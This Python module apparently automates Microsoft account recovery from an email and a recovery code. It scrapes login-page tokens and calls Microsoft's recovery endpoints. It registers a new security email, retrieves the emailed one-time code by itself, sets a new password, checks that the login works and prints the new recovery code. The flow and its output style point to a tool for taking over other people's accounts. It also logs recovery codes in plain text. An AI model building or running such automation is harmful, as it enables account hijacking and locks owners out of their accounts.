from securing.utils.cookies.get_email_code import get_email_code
from securing.utils.cookies.get_livedata import livedata
from securing.utils.cookies.safe_cookies import dedupe_cookies, has_cookie
from urllib.parse import unquote
import asyncio
import logging
import codecs
import httpx
import json
import re


class RecoverError(Exception):
    """User-facing failure during recovery-code flow."""

    def __init__(self, reason: str, *, ms_code: object | None = None):
        super().__init__(reason)
        self.reason = reason
        self.ms_code = ms_code


async def verify_password_works(session: httpx.AsyncClient, email: str, password: str) -> str:
    """Check whether Microsoft accepted the new password.

    Returns: "ok" | "bad" | "unknown"
    """
    try:
        # RecoverUser password propagation is often delayed under load.
        await asyncio.sleep(4.0)
        dedupe_cookies(session)

        live = await livedata(session)
        dedupe_cookies(session)
        check = await session.post(
            url=live["urlPost"],
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": "https://login.live.com/",
            },
            data={
                "login": email,
                "loginfmt": email,
                "passwd": password,
                "PPFT": live["ppft"],
                "type": "11",
                "LoginOptions": "3",
                "ps": "2",
                "psRNGCDefaultType": "",
                "psRNGCEntropy": "",
                "psRNGCSLK": "",
                "canary": "",
                "ctx": "",
                "hpgrequestid": "",
                "PPSX": "Passpor",
                "NewUser": "1",
                "FoundMSAs": "",
                "fspost": "0",
                "i21": "0",
                "CookieDisclosure": "0",
                "IsFidoSupported": "0",
            },
            follow_redirects=False,
        )
        dedupe_cookies(session)
        text = check.text or ""
        lower = text.lower()

        if "too many times" in lower or "try again later" in lower:
            logging.warning("Password verify rate-limited for %s", email)
            return "unknown"

        hard_bad = (
            "that password is incorrect" in lower
            or "your account or password is incorrect" in lower
            or '"serrorcode":"80041012"' in lower
            or "serrorcode\\\":\\\"80041012" in lower
        )
        if hard_bad:
            logging.error(
                "Password verify BAD for %s (status=%s)",
                email,
                check.status_code,
            )
            return "bad"

        if (
            check.status_code in (302, 303)
            or has_cookie(session, "__Host-MSAAUTH")
            or "account.live.com" in (check.headers.get("location") or "")
        ):
            logging.info("Password verify OK for %s (status=%s)", email, check.status_code)
            return "ok"

        if "sErrTxt" in text and "incorrect" in lower:
            return "bad"

        logging.warning(
            "Password verify UNKNOWN for %s (status=%s)",
            email,
            check.status_code,
        )
        return "unknown"
    except httpx.CookieConflict as exc:
        logging.warning("Password verify CookieConflict for %s: %s", email, exc)
        dedupe_cookies(session)
        return "unknown"
    except Exception:
        logging.exception("Password verify crashed for %s", email)
        return "unknown"


MS_HEADERS = {
    "Content-type": "application/json; charset=utf-8",
    "Accept": "application/json",
    "Referer": "https://account.live.com/",
    "Origin": "https://account.live.com",
    "hpgid": "200284",
    "hpgact": "0",
}

RECOVER_SCID = 100103
RECOVER_UIFLVR = 1001

RECOVER_PUBLIC_KEY = "25CE4D96CB3A09A69CD847C69FC6D40AF4A4DE12"

_MS_RECOVERY_CODE_ERRORS = {
    1300: "Invalid or already-used recovery code (Microsoft error 1300).",
    1301: "Recovery code rejected (Microsoft error 1301).",
    1200: "Recovery session expired — retry with the same recovery code.",
    6001: "Recovery credentials expired — retry the account.",
}


def _extract_balanced_object(html: str, start_idx: int) -> str | None:
    if start_idx < 0 or start_idx >= len(html) or html[start_idx] != "{":
        return None
    depth = 0
    in_str = False
    esc = False
    quote = ""
    for i in range(start_idx, len(html)):
        ch = html[i]
        if in_str:
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == quote:
                in_str = False
            continue
        if ch in ("'", '"'):
            in_str = True
            quote = ch
            continue
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                return html[start_idx : i + 1]
    return None


def _extract_server_data(html: str) -> dict | None:
    """Parse ServerData via brace-matching (old regex stopped at first ';')."""
    for pat in (
        r"var\s+ServerData\s*=\s*\{",
        r"window\.ServerData\s*=\s*\{",
        r"ServerData\s*=\s*\{",
    ):
        m = re.search(pat, html)
        if not m:
            continue
        brace_at = html.find("{", m.start())
        raw = _extract_balanced_object(html, brace_at)
        if not raw:
            continue
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            try:
                return json.loads(raw[: raw.rfind("}") + 1])
            except json.JSONDecodeError:
                logging.warning("recover: ServerData JSON decode failed (len=%s)", len(raw))
                continue
    return None


def _parse_json(response: httpx.Response, step: str) -> dict | None:
    if not response.text.strip():
        logging.error("%s: empty response (status %s)", step, response.status_code)
        return None

    try:
        data = response.json()
    except json.JSONDecodeError:
        logging.error(
            "%s: non-JSON response (status %s): %s",
            step,
            response.status_code,
            response.text[:500],
        )
        return None

    if "error" in data and "apiCanary" not in data and "token" not in data and "recoveryCode" not in data:
        err = data.get("error") or {}
        code = err.get("code") if isinstance(err, dict) else err
        logging.error("%s: Microsoft error %s body=%s", step, code, data)
        if step == "VerifyRecoveryCode":
            try:
                code_i = int(code)
            except (TypeError, ValueError):
                code_i = None
            if code_i in _MS_RECOVERY_CODE_ERRORS:
                raise RecoverError(_MS_RECOVERY_CODE_ERRORS[code_i], ms_code=code_i)
            raise RecoverError(
                f"Recovery code rejected by Microsoft (error {code}).",
                ms_code=code,
            )
        return None

    return data


async def recover(
    session: httpx.AsyncClient,
    email: str,
    recovery_code: str,
    new_email: str,
    new_password: str,
):
    """Automates recovery via recovery code.

    Raises RecoverError for invalid recovery codes / known MS rejects.
    Returns the new recovery code string on success, or None on soft failure.
    """
    recovery_code = (recovery_code or "").strip().upper().replace(" ", "")

    data = await session.get(
        url=(
            "https://account.live.com/ResetPassword.aspx"
            f"?wreply=https://login.live.com/oauth20_authorize.srf&mn={email}"
        ),
        follow_redirects=True,
    )
    logging.info(
        "sRecovery: status=%s url=%s len=%s body=%s",
        data.status_code,
        data.url,
        len(data.text or ""),
        (data.text or "")[:1200],
    )

    server_data = _extract_server_data(data.text or "")
    if not server_data or "sRecoveryToken" not in server_data or "apiCanary" not in server_data:
        title_m = re.search(r"<title[^>]*>(.*?)</title>", data.text or "", re.I | re.S)
        title = re.sub(r"\s+", " ", title_m.group(1)).strip()[:80] if title_m else "?"
        logging.error(
            "recover: could not parse ServerData for %s (keys=%s title=%s)",
            email,
            list(server_data.keys())[:20] if server_data else None,
            title,
        )
        raise RecoverError(
            "Recovery page could not be parsed (ServerData/sRecoveryToken missing). Retry."
        )

    decoded_token = codecs.decode(unquote(server_data["sRecoveryToken"]), "unicode_escape")
    uaid = server_data.get("sUnauthSessionID", "")

    rec_token = await session.post(
        url="https://account.live.com/API/Recovery/VerifyRecoveryCode",
        headers={
            **MS_HEADERS,
            "Accept-encoding": "gzip, deflate, br, zstd",
            "Connection": "keep-alive",
            "canary": server_data["apiCanary"],
        },
        json={
            "recoveryCode": recovery_code,
            "code": recovery_code,
            "scid": RECOVER_SCID,
            "token": decoded_token,
            "uaid": uaid,
            "uiflvr": RECOVER_UIFLVR,
        },
    )

    rec_json = _parse_json(rec_token, "VerifyRecoveryCode")
    if not rec_json or "apiCanary" not in rec_json or "token" not in rec_json:
        return None

    canary = rec_json["apiCanary"]
    recover_token = rec_json["token"]

    send_code = await session.post(
        url="https://account.live.com/api/Proofs/SendOtt",
        headers={
            **MS_HEADERS,
            "canary": canary,
        },
        json={
            "associationType": "None",
            "action": "VerifyNewProof",
            "channel": "Email",
            "cxt": "MP",
            "proofId": new_email,
            "scid": RECOVER_SCID,
            "token": recover_token,
            "uaid": uaid,
            "uiflvr": RECOVER_UIFLVR,
        },
    )

    response_json = _parse_json(send_code, "SendOtt")
    if not response_json or "apiCanary" not in response_json:
        return None

    canary = response_json["apiCanary"]
    code = await get_email_code(new_email)
    if not code:
        logging.error("recover: timed out waiting for OTP at %s", new_email)
        raise RecoverError("Timed out waiting for OTP at the new security email during recovery.")

    verify_code_response = await session.post(
        url="https://account.live.com/API/Proofs/VerifyCode",
        headers={
            **MS_HEADERS,
            "canary": canary,
        },
        json={
            "action": "VerifyOtc",
            "proofId": new_email,
            "scid": RECOVER_SCID,
            "token": recover_token,
            "uaid": uaid,
            "uiflvr": RECOVER_UIFLVR,
            "code": code,
        },
    )
    verify_json = _parse_json(verify_code_response, "VerifyCode")
    if not verify_json or "apiCanary" not in verify_json:
        return None

    canary = verify_json["apiCanary"]
    a_token = verify_json.get("token")
    logging.info(
        "RecoverUser using v: token (VerifyCode returned %s…) + publicKey",
        (a_token[:2] if isinstance(a_token, str) else None),
    )

    finish_secure = await session.post(
        url="https://account.live.com/API/Recovery/RecoverUser",
        headers={
            **MS_HEADERS,
            "canary": canary,
        },
        json={
            "contactEmail": new_email,
            "contactEpid": "",
            "password": new_password,
            "passwordExpiryEnabled": 0,
            "publicKey": RECOVER_PUBLIC_KEY,
            "token": recover_token,
        },
    )

    logging.info(
        "RecoverUser status=%s body=%s",
        finish_secure.status_code,
        (finish_secure.text or "")[:800],
    )
    print(f"[~] RecoverUser status={finish_secure.status_code} body={(finish_secure.text or '')[:300]}")

    try:
        finish_json = finish_secure.json() if finish_secure.text.strip() else None
    except json.JSONDecodeError:
        finish_json = None

    if not finish_json:
        logging.error("RecoverUser: empty/non-JSON response")
        return None

    if finish_json.get("error") and not finish_json.get("recoveryCode"):
        err = finish_json.get("error") or {}
        code = err.get("code") if isinstance(err, dict) else err
        logging.error("RecoverUser error: %s", finish_json.get("error"))
        raise RecoverError(f"RecoverUser failed (Microsoft error {code}).")

    if "recoveryCode" in finish_json:
        new_rc = finish_json["recoveryCode"]
        print(f"[+] - RecoverUser OK (password length={len(new_password)}, publicKey=yes)")
        print(f"[+] - New recovery code: {new_rc}")
        logging.info("RecoverUser new recoveryCode=%s contactEmail=%s", new_rc, new_email)
        return new_rc

    logging.error("RecoverUser missing recoveryCode: %s", finish_json)
    return None
